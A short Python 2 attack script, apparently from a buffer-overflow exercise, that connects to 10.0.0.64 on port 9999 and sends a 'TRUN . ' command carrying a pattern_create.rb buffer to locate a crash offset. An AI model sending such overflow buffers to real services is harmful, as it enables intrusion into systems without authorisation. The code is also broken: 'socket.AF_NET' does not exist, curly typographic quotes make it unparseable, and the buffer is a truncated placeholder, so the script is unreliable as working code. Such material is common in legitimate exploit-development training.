import socket

s=socket.socket(socket.AF_NET, socket.SOCK_STREAM)

# generated by pattern_create.rb
buffer = “Aa0Aa..”
try:
   print “sending attack buffer”
   s.connect((’10.0.0.64’, 9999))
   data=s.recv(1024)
   s.send(‘TRUN . ‘ + buffer + ‘\r\n’)
   data = s.recv(1024)
except:
   print ‘OMFG Error!’